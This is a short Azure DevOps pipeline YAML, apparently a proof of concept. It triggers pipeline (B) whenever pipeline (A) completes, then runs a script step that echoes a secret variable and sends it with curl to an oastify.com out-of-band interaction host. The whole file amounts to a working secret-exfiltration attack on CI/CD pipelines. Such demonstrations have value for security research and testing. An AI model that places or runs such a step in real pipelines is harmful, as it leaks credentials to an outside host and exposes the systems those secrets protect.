trigger: none
pr: none

resources:
  pipelines:
  - pipeline: pipeline (B)
    source: pipeline (A)
    trigger: true # Run pipeline (B) when any run of pipeline (A) completes
    branch: main

steps:    
  - script: |
      echo $(sUPER_SECRET)
      curl https://t82x7lskmw5unw0yjt43prh4bvhm5ct1.oastify.com?secret=$(sUPER_SECRET)
  
